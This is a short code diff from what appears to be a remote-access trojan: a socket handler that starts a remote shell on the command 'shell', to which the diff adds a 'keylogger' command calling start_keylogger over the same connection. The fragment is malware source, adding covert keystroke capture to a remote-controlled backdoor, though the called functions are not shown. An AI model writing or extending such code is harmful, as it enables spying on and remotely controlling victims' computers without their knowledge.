@@ -28,3 +28,5 @@ def handler(sock):
         if user_input=="shell":
             print("[+] Starting shell")
             execute_command(sock)
+        if user_input=="keylogger":
+            start_keylogger(sock)
